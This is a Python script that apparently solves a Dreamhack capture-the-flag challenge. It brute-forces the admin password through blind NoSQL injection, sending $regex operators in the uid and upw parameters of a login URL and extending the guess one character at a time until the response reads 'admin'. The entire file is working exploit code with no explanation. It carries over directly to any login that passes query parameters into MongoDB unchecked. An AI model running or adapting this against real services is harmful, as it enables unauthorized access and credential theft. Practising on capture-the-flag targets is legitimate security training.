import requests
import string


TARGET_BASE_URL = 'http://host3.dreamhack.games:17477/login?'
recv = requests.get(TARGET_BASE_URL+"uid[$regex]=i&upw[$regex]=.?.?{8")

chars=string.ascii_letters+string.digits

cur_flag=""

for idx in range(0, 32):
	for ch in chars:
		payload = TARGET_BASE_URL
		payload += "uid[$regex]=i"
		payload += "&upw[$regex]=.?.?{"
		payload += cur_flag
		payload += ch
		recv = requests.get(payload)
		
		print(idx, ch)
		print(recv.text)
		
		res = recv.text
		if res == 'admin':
			cur_flag += ch
			break

print(cur_flag)
